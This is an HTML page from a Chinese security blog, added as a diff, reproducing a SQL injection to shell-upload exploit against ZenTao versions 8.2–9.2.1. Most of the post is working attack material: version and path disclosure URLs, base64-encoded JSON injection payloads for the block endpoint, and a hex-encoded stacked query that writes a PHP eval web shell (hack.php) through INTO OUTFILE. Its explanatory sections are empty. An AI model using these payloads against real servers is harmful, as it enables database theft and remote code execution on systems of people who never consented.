@@ -1,0 +1,250 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>She11c0de&#39;s blogs</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="禅道 8.2-9.2.1 注入&amp;getshell一、漏洞简介二、漏洞影响三、复现过程我这里用的官方集成环境版本8.4 获取版本号：&#x2F;index.php?mode&#x3D;getconfig   绝对路径 获取绝对路径：网址后面随便输入什么就会爆出绝对路径">
+<meta property="og:type" content="article">
+<meta property="og:title" content="She11c0de&#39;s blogs">
+<meta property="og:url" content="https://she11c0de.github.io/2022/07/07/%E7%A6%85%E9%81%93/%E7%A6%85%E9%81%938.2-9.2.1%20%E6%B3%A8%E5%85%A5GetShell/index.html">
+<meta property="og:site_name" content="She11c0de&#39;s blogs">
+<meta property="og:description" content="禅道 8.2-9.2.1 注入&amp;getshell一、漏洞简介二、漏洞影响三、复现过程我这里用的官方集成环境版本8.4 获取版本号：&#x2F;index.php?mode&#x3D;getconfig   绝对路径 获取绝对路径：网址后面随便输入什么就会爆出绝对路径">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://she11c0de.github.io/resource/%E7%A6%85%E9%81%938.2-9.2.1%E6%B3%A8%E5%85%A5GetShell/media/rId24.jpg">
+<meta property="og:image" content="https://she11c0de.github.io/resource/%E7%A6%85%E9%81%938.2-9.2.1%E6%B3%A8%E5%85%A5GetShell/media/rId25.jpg">
+<meta property="og:image" content="https://she11c0de.github.io/resource/%E7%A6%85%E9%81%938.2-9.2.1%E6%B3%A8%E5%85%A5GetShell/media/rId27.jpg">
+<meta property="article:published_time" content="2022-07-08T06:26:09.623Z">
+<meta property="article:modified_time" content="2022-07-08T07:24:51.296Z">
+<meta property="article:author" content="She11c0de">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://she11c0de.github.io/resource/%E7%A6%85%E9%81%938.2-9.2.1%E6%B3%A8%E5%85%A5GetShell/media/rId24.jpg">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/scrollUp/image.css">
+
+  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <div class="logo">
+        <img src="/logo.png" alt="Profile Picture">
+      </div>
+      <div id="title">She11c0de's blogs</div>
+      
+       <ul class="my-socials">
+  
+ 
+</ul>
+    </div>
+  </div>
+  <div id="header-inner" class="">
+    <nav id="main-nav">
+      <a id="main-nav-toggle" class="nav-icon"></a>
+      <!--
+        
+          
+            <a class="main-nav-link" href="/">首页</a>
+          
+            <a class="main-nav-link" href="/categories/life">生活</a>
+          
+            <a class="main-nav-link" href="/archives">归档</a>
+          
+        
+      -->
+    </nav>
+    <nav id="title-nav" style="display:none">
+      <a href="/">She11c0de&#39;s blogs</a>
+      <img src="/logo.png" alt="Profile Picture">
+      <!--
+      <span id="title-nav-socials">
+        
+       
+     </span>
+      -->
+    </nav>
+    <nav id="sub-nav">
+      
+      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+    </nav>
+    <div id="search-form-wrap">
+      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
+        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
+        <input type="submit" value="" class="search-form-submit">
+        <input name=tn type=hidden value="bds">
+        <input name=cl type=hidden value="3">
+        <input name=ct type=hidden value="2097152">
+        <input type="hidden" name="si" value="she11c0de.github.io">
+      </form>
+    </div>
+  </div>
+  <div class="site-nav" style="display: none;">
+    <ul>
+      
+      
+        <li><a href="/">首页</a></li>
+      
+        <li><a href="/categories/life">生活</a></li>
+      
+        <li><a href="/archives">归档</a></li>
+      
+      
+    </ul>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-禅道/禅道8.2-9.2.1 注入GetShell" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/%E7%A6%85%E9%81%93/%E7%A6%85%E9%81%938.2-9.2.1%20%E6%B3%A8%E5%85%A5GetShell/" class="article-date">
+  <time datetime="2022-07-08T06:26:09.623Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="禅道-8-2-9-2-1-注入-amp-getshell"><a href="#禅道-8-2-9-2-1-注入-amp-getshell" class="headerlink" title="禅道 8.2-9.2.1 注入&amp;getshell"></a>禅道 8.2-9.2.1 注入&amp;getshell</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>我这里用的官方集成环境版本8.4</p>
+<pre><code>获取版本号：/index.php?mode=getconfig
+</code></pre>
+<p><img src="/resource/%E7%A6%85%E9%81%938.2-9.2.1%E6%B3%A8%E5%85%A5GetShell/media/rId24.jpg"></p>
+<p>绝对路径</p>
+<p>获取绝对路径：网址后面随便输入什么就会爆出绝对路径</p>
+<p><img src="/resource/%E7%A6%85%E9%81%938.2-9.2.1%E6%B3%A8%E5%85%A5GetShell/media/rId25.jpg"></p>
+<p>没路径的报错exp：</p>
+<pre><code>&#123;&quot;orderBy&quot;:&quot;order limit 1,1 PROCEDURE ANALYSE(polygon(id),1)#&quot;,&quot;num&quot;:&quot;1,1&quot;,&quot;type&quot;:&quot;openedbyme&quot;&#125;
+</code></pre>
+<p>base64加密：</p>
+<pre><code>eyJvcmRlckJ5Ijoib3JkZXIgbGltaXQgMSwxIFBST0NFRFVSRSBBTkFMWVNFKHBvbHlnb24oaWQpLDEpIyIsIm51bSI6IjEsMSIsInR5cGUiOiJvcGVuZWRieW1lIn0=
+</code></pre>
+<p>EXP</p>
+<pre><code>提交地址：http://127.0.0.1:81/zentao/index.php?m=block&amp;f=main&amp;mode=getblockdata&amp;blockid=case&amp;param=base64
+</code></pre>
+<p>※exp需要base64加密后才能提交，且回显、写Shell须加上Referer：<a target="_blank" rel="noopener" href="http://127.0.0.1:81/zentao/">http://127.0.0.1:81/zentao/</a></p>
+<p>注入显密码：</p>
+<pre><code>&#123;&quot;orderBy&quot;:&quot;order limit 1;#&quot;,&quot;num&quot;:&quot;1,1&quot;,&quot;type&quot;:&quot;openedbyme&quot;&#125;
+</code></pre>
+<p>base64加密：</p>
+<pre><code>eyJvcmRlckJ5Ijoib3JkZXIgbGltaXQgMTsjIiwibnVtIjoiMSwxIiwidHlwZSI6Im9wZW5lZGJ5bWUifQ==
+</code></pre>
+<p>不知道什么原因，本地复现无账号密码回显。。。</p>
+<p><img src="/resource/%E7%A6%85%E9%81%938.2-9.2.1%E6%B3%A8%E5%85%A5GetShell/media/rId27.jpg"></p>
+<p>前台GetShell：</p>
+<pre><code>&#123;&quot;orderBy&quot;:&quot;order limit 1;SET @SQL=0x73656C65637420273C3F70687020406576616C28245F504F53545B785D293F3E2720696E746F206F757466696C652027443A2F7A656E74616F2F78616D70702F7A656E74616F2F7777772F6861636B2E70687027;PREPARE pord FROM @SQL;EXECUTE pord;-- -&quot;,&quot;num&quot;:&quot;1,1&quot;,&quot;type&quot;:&quot;openedbyme&quot;&#125;
+</code></pre>
+<p>其中有部分使用了MySQL的预处理查询绕过程序的过滤：</p>
+<p>导出shell：</p>
+<pre><code>select &#39;&lt;?php @eval($_POST[x])?&gt;&#39; into outfile &#39;D:/zentao/xampp/zentao/www/hack.php&#39;
+</code></pre>
+<p>HEX编码：（注意加密解密都不带0x，但是EXP中需要加上）</p>
+<pre><code>73656C65637420273C3F70687020406576616C28245F504F53545B785D293F3E2720696E746F206F757466696C652027443A2F7A656E74616F2F78616D70702F7A656E74616F2F7777772F6861636B2E70687027
+</code></pre>
+<p>base64加密：</p>
+<pre><code>eyJvcmRlckJ5Ijoib3JkZXIgbGltaXQgMTtTRVQgQFNRTD0weDczNjU2QzY1NjM3NDIwMjczQzNGNzA2ODcwMjA0MDY1NzY2MTZDMjgyNDVGNTA0RjUzNTQ1Qjc4NUQyOTNGM0UyNzIwNjk2RTc0NkYyMDZGNzU3NDY2Njk2QzY1MjAyNzQ0M0EyRjdBNjU2RTc0NjE2RjJGNzg2MTZENzA3MDJGN0E2NTZFNzQ2MTZGMkY3Nzc3NzcyRjY4NjE2MzZCMkU3MDY4NzAyNztQUkVQQVJFIHBvcmQgRlJPTSBAU1FMO0VYRUNVVEUgcG9yZDstLSAtIiwibnVtIjoiMSwxIiwidHlwZSI6Im9wZW5lZGJ5bWUifQ==
+</code></pre>
+<p>访问之即可在目录下生成hack.php：</p>
+<p>image</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/%E7%A6%85%E9%81%93/%E7%A6%85%E9%81%938.2-9.2.1%20%E6%B3%A8%E5%85%A5GetShell/" data-id="cl5c2qzyp00ouy8v1ged26v0l" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2022/07/07/%E7%A6%85%E9%81%93/%E7%A6%85%E9%81%93_=12.4.2%20%E5%90%8E%E5%8F%B0getshell/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          (no title)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2022/07/07/%E7%A6%85%E9%81%93/%E7%A6%85%E9%81%93%2011.6%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title"></div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 She11c0de<br>
+      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <!--
+      <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">首页</a>
+  
+    <a href="/categories/life" class="mobile-nav-link">生活</a>
+  
+    <a href="/archives" class="mobile-nav-link">归档</a>
+  
+</nav>
+    -->
+    
+
+<!-- 百度分享 start -->
+
+<!-- 百度分享 end -->
+
+<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
+
+
+
+
+<script src="/js/jquery.scrollUp.min.js"></script>
+
+
+<script src="/js/jquery.transform.js"></script>
+
+
+<script src="/js/menu.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+<script src="/js/scrollUp.js"></script>
+
+
+  </div>
+</body>
+</html>
